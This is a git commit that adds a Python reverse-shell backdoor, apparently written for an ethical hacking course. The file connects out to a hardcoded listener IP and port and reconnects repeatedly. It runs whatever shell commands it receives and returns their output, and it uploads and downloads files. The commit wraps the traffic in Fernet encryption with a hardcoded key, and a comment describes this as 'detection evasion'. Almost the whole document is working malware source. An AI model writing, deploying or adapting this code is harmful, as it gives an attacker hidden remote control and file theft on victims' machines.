7669eb206551f4ccc884cf1cd63216c71b33f1c9
TayR-D <tayra.devacc@gmail.com>
2025-06-20 15:02:23 +0700

    feat: added AES enc for secure comms

---
+++ Enhanced/backdoor.py
@@ -0,0 +1,109 @@
+################################################
+# Authors: Korn D.,                            #
+# Class: SIIT Ethical Hacking, 2023-2024       #
+################################################
+
+# Import necessary Python modules
+import socket  # For network communication
+import time  # For adding delays
+import subprocess  # For running shell commands
+import json  # For encoding and decoding data in JSON format
+import os  # For interacting with the operating system
+from cryptography.fernet import Fernet  # Encrypted communication for detection evasion
+
+# Pre-shared key for encryption
+psk_aes = b'-SDf80BDeTTeY7jFiydQshGVwpufGx4S9J2sANAJWrI=' # Hardcoded cuz I couldn't careless :P
+cipher = Fernet(psk_aes)  # Create a Fernet cipher object for encryption
+
+# Function to send data in a reliable way (encoded as JSON)
+def reliable_send(data):
+    jsondata = json.dumps(data)  # Convert data to JSON format
+    encrypted_data = cipher.encrypt(jsondata.encode())  # Encrypt the JSON data
+    s.send(encrypted_data)  # Send the encrypted data over the network
+
+# Function to receive data in a reliable way (expects JSON data)
+def reliable_recv():
+    data = b''  # Initialize an empty byte string to hold received data
+    while True:
+        try:
+            data += s.recv(1024)  # Receive data in chunks of 1024 bytes
+            if not data:
+                continue
+            decrypted_data = cipher.decrypt(data)  # Decrypt the received data *added*
+            return json.loads(decrypted_data.decode())  # Parse the received JSON data
+        except ValueError:
+            continue
+
+
+# Function to establish a connection to a remote host
+def connection():
+    while True:
+        time.sleep(20)  # Wait for 20 seconds before reconnecting (for resilience)
+        try:
+            # Connect to a remote host with Listener IP and port 5555
+            s.connect(('192.168.210.143', 5555))
+            # Once connected, enter the shell() function for command execution
+            shell()
+            # Close the connection when done
+            s.close()
+            break
+        except:
+            # If a connection error occurs, retry the connection
+            connection()
+
+
+# Function to upload a file to the remote host
+def upload_file(file_name):
+    f = open(file_name, 'rb')  # Open the specified file in binary read mode
+    s.send(f.read())  # Read and send the file's contents over the network
+
+
+# Function to download a file from the remote host
+def download_file(file_name):
+    f = open(file_name, 'wb')  # Open a file for binary write mode
+    s.settimeout(1)  # Set a timeout for receiving data
+    chunk = s.recv(1024)  # Receive data in chunks of 1024 bytes
+    while chunk:
+        f.write(chunk)  # Write the received data to the file
+        try:
+            chunk = s.recv(1024)  # Receive the next chunk
+        except socket.timeout as e:
+            break
+    s.settimeout(None)  # Reset the timeout setting
+    f.close()  # Close the file when done
+
+
+# Main shell function for command execution
+def shell():
+    while True:
+        # Receive a command from the remote host
+        command = reliable_recv()
+        if command == 'quit':
+            # If the command is 'quit', exit the shell loop
+            break
+        elif command == 'clear':
+            # If the command is 'clear', do nothing (used for clearing the screen)
+            pass
+        elif command[:3] == 'cd ':
+            # If the command starts with 'cd ', change the current directory
+            os.chdir(command[3:])
+        elif command[:8] == 'download':
+            # If the command starts with 'download', upload a file to the remote host
+            upload_file(command[9:])
+        elif command[:6] == 'upload':
+            # If the command starts with 'upload', download a file from the remote host
+            download_file(command[7:])
+        else:
+            # For other commands, execute them using subprocess
+            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            result = execute.stdout.read() + execute.stderr.read()  # Capture the command's output
+            result = result.decode()  # Decode the output to a string
+            # Send the command execution result back to the remote host
+            reliable_send(result)
+
+
+# Create a socket object for communication over IPv4 and TCP
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# Start the connection process by calling the connection() function
+connection()
